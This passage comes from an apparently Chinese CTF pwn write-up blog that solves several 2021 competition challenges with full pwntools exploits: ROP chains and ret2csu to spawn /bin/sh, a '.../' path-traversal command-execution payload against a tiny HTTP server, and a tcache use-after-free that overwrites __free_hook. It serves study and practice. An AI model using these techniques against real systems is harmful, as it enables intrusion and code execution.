<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;warmup&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">vuln = <span class="number">0x0804815A</span></span><br><span class="line">sys_write = <span class="number">0x08048135</span> </span><br><span class="line">sys_read = <span class="number">0x0804811D</span></span><br><span class="line">set_ebx_ecx_edx_int80 = <span class="number">0x08048122</span> </span><br><span class="line">alarm = <span class="number">0x0804810D</span> </span><br><span class="line">flag_addr = <span class="number">0x080491BC</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> </span><br><span class="line">payload1 += p32(sys_read)</span><br><span class="line">payload1 += p32(vuln)</span><br><span class="line">payload1 += p32(<span class="number">0</span>) <span class="comment">#fd</span></span><br><span class="line">payload1 += p32(flag_addr) <span class="comment">#buf</span></span><br><span class="line">payload1 += p32(<span class="number">0x10</span>)   <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;./flag\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload2 += p32(alarm) <span class="comment"># mov rax , 5</span></span><br><span class="line">payload2 += p32(set_ebx_ecx_edx_int80)  <span class="comment"># open</span></span><br><span class="line">payload2 += p32(vuln)</span><br><span class="line">payload2 += p32(flag_addr)  <span class="comment"># ./flag</span></span><br><span class="line">payload2 += p32(<span class="number">4</span>) </span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload3 += p32(sys_read)</span><br><span class="line">payload3 += p32(vuln)</span><br><span class="line">payload3 += p32(<span class="number">0</span>) <span class="comment">#fd</span></span><br><span class="line">payload3 += p32(flag_addr+<span class="number">0x10</span>)  <span class="comment">#buf</span></span><br><span class="line">payload3 += p32(<span class="number">0x10</span>) <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload4 += p32(sys_write)</span><br><span class="line">payload4 += p32(<span class="number">0</span>)</span><br><span class="line">payload4 += p32(<span class="number">1</span>)  <span class="comment">#fd</span></span><br><span class="line">payload4 += p32(flag_addr+<span class="number">0x10</span>) <span class="comment">#buf</span></span><br><span class="line">payload4 += p32(<span class="number">0x10</span>) <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/4.png" alt="pic"></p>
<h2 id="2021-11-22"><a href="#2021-11-22" class="headerlink" title="2021-11-22"></a>2021-11-22</h2><h3 id="2021-西湖论剑-blind"><a href="#2021-西湖论剑-blind" class="headerlink" title="[2021 西湖论剑]blind"></a>[2021 西湖论剑]blind</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/blind">附件</a></p>
<h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>这题的漏洞点比较明显，就是一个栈溢出</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/5.png" alt="pic"></p>
<p>这题一开始看到想到的是去用syscall，然后没找到syscall又去现学ret2dlresolve来做，搞了半天没搞出来。赛后看师傅们的wp才知道可以用alarm_got去爆破出syscall。</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/6.png" alt="pic"></p>
<p>可以看到syscall位于<code>&lt;alarm+9&gt;</code>的位置,我们只要通过修改alarm的got表的低一位就可以得到syscall了，由于这里是本地的环境，我们可以通过调试来获得这个偏移，而由于我们没有远程环境的libc，这个偏移就需要去爆破了。</p>
<p>我们可以通过ret2csu来修改alarm_got的低位使其指向syscall，然后再利用read来控制rax寄存器为59，然后去执行59号系统调用execve(‘/bin/sh’,0,0)来getshell</p>
<h4 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="Step1-ret2csu模板定义"><a href="#Step1-ret2csu模板定义" class="headerlink" title="Step1 ret2csu模板定义"></a>Step1 ret2csu模板定义</h5><p>ret2csu要注意的是，rdi为第一个参数的存放寄存器，rsi为第二个参数，rdx为第三个参数。（由于太久没用ret2csu了，导致寄存器搞错了而调了半天）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">r12,rdx,rsi,rdi</span>):</span></span><br><span class="line">	payload = p64(<span class="number">0x04007BA</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(r12) + p64(rdi) + p64(rsi) +p64(rdx) + p64(<span class="number">0x04007A0</span>)</span><br><span class="line">	payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>  </span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<h5 id="Step2-修改alarm-got"><a href="#Step2-修改alarm-got" class="headerlink" title="Step2 修改alarm_got"></a>Step2 修改alarm_got</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+csu(read_got,<span class="number">0</span>,alarm_got,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">······</span><br><span class="line">p.send(<span class="string">b&#x27;\x19&#x27;</span>) <span class="comment">#本地调试出来的，远程需要爆破</span></span><br></pre></td></tr></table></figure>
<h5 id="Step3-执行59号系统调用"><a href="#Step3-执行59号系统调用" class="headerlink" title="Step3 执行59号系统调用"></a>Step3 执行59号系统调用</h5><p>此时我们已经得到了syscall,那么接下来需要控制rax的值为59</p>
<p>这里又是一个我通过这道题学到的点：<strong>read函数会把rax的值赋值成输入的长度</strong><br><img src="https://gitee.com/Nss-harukii/images/raw/master/7.png" alt="pic"></p>
<p>那么只要控制我们的输入长度为59就能使rax的值为59</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload += csu(read_got,<span class="number">0</span>,elf.bss(<span class="number">0x100</span>),<span class="number">0x100</span>)  <span class="comment"># mov rax,59</span></span><br><span class="line">payload += csu(alarm_got,elf.bss(<span class="number">0x100</span>),<span class="number">0</span>,<span class="number">0</span>)     <span class="comment"># execve(&#x27;/bin/sh\x00&#x27;,0,0)</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">b&#x27;\x00&#x27;</span>))         <span class="comment"># read /bin/sh in bss </span></span><br></pre></td></tr></table></figure>
<h4 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;blind&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">alarm_got = elf.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">r12,rdx,rsi,rdi</span>):</span></span><br><span class="line">	payload = p64(<span class="number">0x04007BA</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(r12) + p64(rdi) + p64(rsi) +p64(rdx) + p64(<span class="number">0x04007A0</span>)</span><br><span class="line">	payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">i</span>):</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">&quot;blind&quot;</span>)</span><br><span class="line">		payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+csu(read_got,<span class="number">0</span>,alarm_got,<span class="number">1</span>)</span><br><span class="line">		payload += csu(read_got,<span class="number">0</span>,elf.bss(<span class="number">0x100</span>),<span class="number">59</span>)</span><br><span class="line">		payload += csu(alarm_got,elf.bss(<span class="number">0x100</span>),<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment">#gdb.attach(p,&quot;b * 0x4007a9&quot;)</span></span><br><span class="line">		sleep(<span class="number">3</span>)</span><br><span class="line">		p.send(payload)</span><br><span class="line">		sleep(<span class="number">0.5</span>)</span><br><span class="line">		p.send(<span class="built_in">chr</span>(i))</span><br><span class="line">		<span class="comment">#gdb.attach(p)</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">chr</span>(i))</span><br><span class="line">		sleep(<span class="number">0.5</span>)</span><br><span class="line">		p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">		p.sendline(<span class="string">&quot;echo yay&quot;</span>)</span><br><span class="line">		s = p.recv(<span class="number">3</span>)</span><br><span class="line">		<span class="keyword">if</span> s == <span class="string">b&#x27;yay&#x27;</span>:</span><br><span class="line">			p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">			p.interactive()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">	pwn(i)</span><br></pre></td></tr></table></figure>
<h2 id="2021-11-23"><a href="#2021-11-23" class="headerlink" title="2021-11-23"></a>2021-11-23</h2><h3 id="2021-湖湘杯-tiny-httpd"><a href="#2021-湖湘杯-tiny-httpd" class="headerlink" title="[2021 湖湘杯] tiny_httpd"></a>[2021 湖湘杯] tiny_httpd</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/tiny_httpd.zip">附件</a></p>
<p>这种类型的webpwn目前为止见过3次，第一次是在国赛决赛BF阶段（比赛中没抽到），第二次实在广东省强网杯个人赛的决赛题（当时群友分享的），第三次就是在今年的湖湘杯。</p>
<p>这类题大概就是用C实现一个建议的http服务器，这道题比较适合入门，这题的漏洞比较简单，代码量较少，同时也给出了源码。</p>
<h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>首先现在本地搭好环境，我用的是题目给出的dockerfile，当然也可以直接在Ubuntu 18 的系统上直接运行</p>
<p>环境起好之后可以本地访问到这样一个页面<br><img src="https://gitee.com/Nss-harukii/images/raw/master/12.png" alt="pic"></p>
<p>接下来分析核心代码httpd.c</p>
<p>漏洞代码部分如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(path);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; j &lt; len;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (path[j] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; path[j + <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    path[i++] = path[j++];</span><br><span class="line">&#125;</span><br><span class="line">path[i++] = <span class="string">&#x27;\0&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>我们只需要构造<code>.../</code>就能完成目录穿越,去访问任意目录</p>
<p>我们再来看关于路径处理的部分<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果 path 数组中的这个字符串的最后一个字符是以字符 / 结尾的话，就拼接上一个&quot;index.html&quot;的字符串。首页的意思</span></span><br><span class="line"> <span class="keyword">if</span> (path[<span class="built_in">strlen</span>(path) - <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">  <span class="built_in">strcat</span>(path, <span class="string">&quot;index.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在系统上去查询该文件是否存在</span></span><br><span class="line"> <span class="keyword">if</span> (stat(path, &amp;st) == <span class="number">-1</span>) &#123;</span><br><span class="line">  <span class="comment">//如果不存在，那把这次 http 的请求后续的内容(head 和 body)全部读完并忽略</span></span><br><span class="line">  <span class="keyword">while</span> ((numchars &gt; <span class="number">0</span>) &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, buf))  <span class="comment">/* read &amp; discard headers */</span></span><br><span class="line">   numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="comment">//然后返回一个找不到文件的 response 给客户端</span></span><br><span class="line">  not_found(client);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="comment">//文件存在，那去跟常量S_IFMT相与，相与之后的值可以用来判断该文件是什么类型的</span></span><br><span class="line">  <span class="comment">//S_IFMT参读《TLPI》P281，与下面的三个常量一样是包含在&lt;sys/stat.h&gt;</span></span><br><span class="line">  <span class="keyword">if</span> ((st.st_mode &amp; S_IFMT) == S_IFDIR)  </span><br><span class="line">   <span class="comment">//如果这个文件是个目录，那就需要再在 path 后面拼接一个&quot;/index.html&quot;的字符串</span></span><br><span class="line">   <span class="built_in">strcat</span>(path, <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//S_IXUSR, S_IXGRP, S_IXOTH三者可以参读《TLPI》P295</span></span><br><span class="line">  <span class="keyword">if</span> ((st.st_mode &amp; S_IXUSR) ||       </span><br><span class="line">      (st.st_mode &amp; S_IXGRP) ||</span><br><span class="line">      (st.st_mode &amp; S_IXOTH)    )</span><br><span class="line">   <span class="comment">//如果这个文件是一个可执行文件，不论是属于用户/组/其他这三者类型的，就将 cgi 标志变量置一</span></span><br><span class="line">   cgi = <span class="number">1</span>;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span> (!cgi)</span><br><span class="line">   <span class="comment">//如果不需要 cgi 机制的话，</span></span><br><span class="line">   serve_file(client, path);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   <span class="comment">//如果需要则调用</span></span><br><span class="line">   execute_cgi(client, path, method, query_string);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> close(client);</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>分析发现当我们传入的路径是一个可执行文件，如<code>/bin/sh</code>,那么就回去调用它</p>
<p>我们跟进到excute_cgi函数，这里只取一些关键的部分<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((numchars &gt; <span class="number">0</span>) &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, buf))</span><br><span class="line">&#123;</span><br><span class="line"> buf[<span class="number">15</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"> <span class="keyword">if</span> (strcasecmp(buf, <span class="string">&quot;Content-Length:&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">  content_length = atoi(&amp;(buf[<span class="number">16</span>])); <span class="comment">//记录 body 的长度大小</span></span><br><span class="line"> numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (content_length == <span class="number">-1</span>) &#123;</span><br><span class="line"> bad_request(client);</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><br>通过审计发现我们必须要在header中传入指示body长度大小的参数<code>Content-Length</code>，否则就会报错返回</p>
<p>这里去执行我们传入的路径<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execl(path, path, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></p>
<p>同时如果我们传入的是<code>POST</code>方法的话,就继续读 body 的内容，并写到 cgi_input 管道里让子进程去读<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;POST&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; content_length; i++) &#123;</span><br><span class="line">  recv(client, &amp;c, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  write(cgi_input[<span class="number">1</span>], &amp;c, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>那么我们只需要利用目录穿越执行/bin/sh，同时再传入<code>Content-Length</code>，就能去执行我们在body中传入的命令了</p>
<p>最后要注意下get_line函数中的一些规则<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_line</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">char</span> c = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"> <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> ((i &lt; size - <span class="number">1</span>) &amp;&amp; (c != <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"> &#123;</span><br><span class="line">  n = recv(sock, &amp;c, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">/* DEBUG printf(&quot;%02X\n&quot;, c); */</span></span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span> (c == <span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    n = recv(sock, &amp;c, <span class="number">1</span>, MSG_PEEK);</span><br><span class="line">    <span class="comment">/* DEBUG printf(&quot;%02X\n&quot;, c); */</span></span><br><span class="line">    <span class="keyword">if</span> ((n &gt; <span class="number">0</span>) &amp;&amp; (c == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">     recv(sock, &amp;c, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     c = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   buf[i] = c;</span><br><span class="line">   i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   c = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> buf[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">body= <span class="string">&quot;echo `cat flag` &gt; ./htdocs/index.html\n&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;POST /.../.../.../.../bin/sh HTTP1.1\r\n&quot;</span></span><br><span class="line">payload += <span class="string">&quot;Content-Length: &#123;&#125;\r\n\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(body))</span><br><span class="line">payload += body</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/13.png" alt="pic"></p>
<h2 id="2021-11-24"><a href="#2021-11-24" class="headerlink" title="2021-11-24"></a>2021-11-24</h2><h3 id="CISCN-2021初赛-lonelywolf"><a href="#CISCN-2021初赛-lonelywolf" class="headerlink" title="[CISCN 2021初赛]lonelywolf"></a>[CISCN 2021初赛]lonelywolf</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/lonelywolf.zip">附件</a></p>
<p>当时打初赛的时候还只是一个只会栈溢出的fw，做这道题相当于是补下题，同时也是为了做silverwolf的学习堆中的Srop坐下前置准备</p>
<h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>add 函数</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/14.png" alt="pic"></p>
<p>让输入一个Index但是，这个index并没有什么卵用，我们从始至终都只能控制一个堆块，这很符合题意——独狼</p>
<p>同时控制了大小最大为0x78</p>
<p>delete 函数</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/15.png" alt="pic"></p>
<p>存在UAF漏洞</p>
<p>既然我们只能控制一个堆块，那么我们就可以考虑去控制tcache结构体，修改tcache_count,将tcache释放到unsorted bin中去leak libc，最后再去劫持malloc_hook或free_hook来getshell</p>
<h4 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="Step1-double-free-得到堆地址"><a href="#Step1-double-free-得到堆地址" class="headerlink" title="Step1 double free 得到堆地址"></a>Step1 double free 得到堆地址</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>) <span class="comment">#绕过double free检查</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<h5 id="Step2-劫持tcache"><a href="#Step2-劫持tcache" class="headerlink" title="Step2 劫持tcache"></a>Step2 劫持tcache</h5><p>我们可以先将当前堆块的fd指针指向tcache_fd</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/16.png" alt="pic"></p>
<p>接下来再申请两次就能申请到tacahe，由于tcache chunk大小为0x250，那么我们就可以通过修改0x250大小的chunk的count为7，就能将tacahe释放到unsorted bin中来leak libc了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))               </span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)                        </span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure></p>
<h5 id="Step3-劫持free-hook"><a href="#Step3-劫持free-hook" class="headerlink" title="Step3 劫持free_hook"></a>Step3 劫持free_hook</h5><p>我们先来看下此时bins中的情况</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/17.png" alt="pic"></p>
<p>这是因为由于tcache 被释放进unsorted bin后在原本这些tcache counts对应的地方被写入了main_arena_xx的地址，再加上我们最大只能申请0x78,如果我们用0x20 ~ 0x70的块来劫持free_hook的话就需要用到fastbin bin,那显然我们用0x80的chunk来tcache double free 劫持free_hook更加容易些。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h4 id="完整exp-3"><a href="#完整exp-3" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;lonelywolf&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">4</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#add(0,0x78)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span 